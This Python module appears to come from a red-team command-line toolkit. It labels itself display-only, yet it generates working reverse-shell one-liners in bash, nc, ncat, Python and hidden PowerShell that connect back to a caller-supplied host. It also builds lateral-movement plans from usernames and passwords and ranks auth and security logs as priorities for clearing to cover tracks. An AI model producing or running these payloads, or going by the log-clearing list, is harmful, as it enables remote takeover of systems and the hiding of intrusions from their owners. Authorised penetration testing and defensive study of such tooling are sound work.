#!/usr/bin/env python3
# cybercli/core/redteam_core.py
# -*- coding: utf-8 -*-
"""
Red Team helpers (toolkit mode, SAFETY-FIRST: generators, planners, visualizers).
NOT exploitation — this module only generates strings, maps, and visualizable plans.

Features:
 - payload template generator (reverse shells, downloader one-liners) — generator only, no execution
 - lateral movement planner: build a mapping of assets -> credentials -> possible hops (graph data)
 - credential mapping store (in-memory or JSON file)
 - attack path visualizer data generator (export JSON for graph_utils)
 - automated log-cleanup checker (simulator): identifies suspicious log locations to clear in a real red team (report only; do not execute)
"""

from __future__ import annotations
from pathlib import Path
from typing import Dict,List,Any,Optional
import json, datetime, os, hashlib

# try to reuse privesc writer
try:
    from cybercli.core.privesc_core import ensure_dir as _ensure_dir, write_html_report as _write_html_report, now_stamp as _now_stamp
    _HAS_PRIVESC_REPORT = True
except Exception:
    _HAS_PRIVESC_REPORT = False

def ensure_dir(p: Path) -> Path:
    p.mkdir(parents=True, exist_ok=True)
    return p

def now_stamp() -> str:
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

def simple_write_report(outdir: Path, base: str, body: str) -> Dict[str,str]:
    outdir = ensure_dir(outdir)
    txt = outdir / f"{base}.txt"
    html = outdir / f"{base}.html"
    started = datetime.datetime.utcnow().isoformat() + "Z"
    txt.write_text(body, encoding="utf-8")
    html.write_text(f"<html><body><pre>{body}</pre></body></html>", encoding="utf-8")
    return {"txt": str(txt.resolve()), "html": str(html.resolve())}

def write_report_auto(outdir: Path, base: str, cmd: List[str], rc: int, out: str, err: str, started_ts: str, ended_ts: str, meta: Optional[dict]=None) -> Dict[str,str]:
    if _HAS_PRIVESC_REPORT:
        try:
            return _write_html_report(outdir, base, cmd, rc, out, err, started_ts, ended_ts, meta=meta)
        except Exception:
            pass
    return simple_write_report(outdir, base, out)

# ---------------- payload generators ----------------
def generate_reverse_shells(host: str, port: int, unix: bool = True, windows: bool = True) -> Dict[str,str]:
    """
    Generate safe, display-only reverse shell one-liners for common runtimes.
    Do NOT execute these automatically.
    """
    out = {}
    if unix:
        out["bash_tcp"] = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        out["nc"] = f"nc -e /bin/sh {host} {port}  # if nc supports -e"
        out["ncat"] = f"ncat {host} {port} -e /bin/sh"
        out["python"] = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{host}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
    if windows:
        out["powershell"] = f"powershell -NoP -NonI -W Hidden -C \"New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\""

    return out

# ---------------- credential mapping ----------------
def credential_store_save(path: Path, cred_map: Dict[str,Any]):
    ensure_dir(path.parent)
    path.write_text(json.dumps(cred_map, indent=2), encoding="utf-8")

def credential_store_load(path: Path) -> Dict[str,Any]:
    if not path.exists():
        return {}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return {}

# ---------------- lateral movement planner ----------------
def build_lateral_plan(assets: List[Dict[str,Any]], credentials: Dict[str,List[str]]) -> Dict[str,Any]:
    """
    assets: [{"hostname": "host1", "os": "linux", "services": ["ssh","winrm"]}, ...]
    credentials: {"user1": ["pass1","pass2"], ...}
    Returns a graph-like plan mapping possible hops (very conservative).
    """
    plan = {"nodes": [], "edges": []}
    # nodes are hosts
    for a in assets:
        plan["nodes"].append({"id": a.get("hostname"), "meta": a})
    # edges: if credential username matches service recommendation
    for a in assets:
        for user, pwds in credentials.items():
            # naive rule: if asset has winrm -> user may attempt windows creds
            if "winrm" in a.get("services",[]) or "rdp" in a.get("services",[]):
                plan["edges"].append({"from": user, "to": a.get("hostname"), "type": "possible-windows-cred"})
            if "ssh" in a.get("services",[]):
                plan["edges"].append({"from": user, "to": a.get("hostname"), "type": "possible-ssh-cred"})
    return plan

# ---------------- attack path exporter ----------------
def export_attack_path_json(plan: Dict[str,Any], outpath: Path) -> str:
    ensure_dir(outpath.parent)
    outpath.write_text(json.dumps(plan, indent=2), encoding="utf-8")
    return str(outpath.resolve())

# ---------------- log-cleanup checker (report-only) ----------------
def log_cleanup_suggestions(system_type: str = "linux") -> Dict[str,Any]:
    """
    Provide a list of potential log locations a red team would consider (report-only).
    This function DOES NOT execute deletion; it only lists and scores priority.
    """
    items = []
    if system_type.lower() == "linux":
        candidates = ["/var/log/auth.log","/var/log/secure","/var/log/syslog","/var/log/messages","/var/log/audit/audit.log","/var/log/maillog"]
    else:
        candidates = ["C:\\Windows\\System32\\winevt\\Logs\\Security.evtx","C:\\Windows\\System32\\winevt\\Logs\\System.evtx"]
    for p in candidates:
        score = 5
        if "auth" in p or "Security" in p:
            score = 10
        items.append({"path": p, "priority": score})
    return {"suggestions": items}

# ---------------- high-level bundles ----------------
def redteam_bundle_payloads_and_plan(report_root: Path, target_name: str, host: str, port: int, assets: List[Dict[str,Any]], credentials: Dict[str,List[str]], out_json: Optional[str] = None) -> Dict[str,Any]:
    run_root = ensure_dir(report_root / target_name / now_stamp())
    outdir = ensure_dir(run_root / "redteam")
    started = datetime.datetime.utcnow().isoformat() + "Z"
    payloads = generate_reverse_shells(host, port)
    plan = build_lateral_plan(assets, credentials)
    # export attack path if requested
    export_path = None
    if out_json:
        export_path = export_attack_path_json(plan, Path(outdir) / out_json)
    body = {"payloads": payloads, "plan": plan, "exported_attack_path": export_path}
    ended = datetime.datetime.utcnow().isoformat() + "Z"
    rep = write_report_auto(outdir, "redteam_bundle", ["redteam_bundle"], 0, json.dumps(body, indent=2), "", started, ended, meta={"tool":"redteam_bundle"})
    return {"report": rep, "body": body}

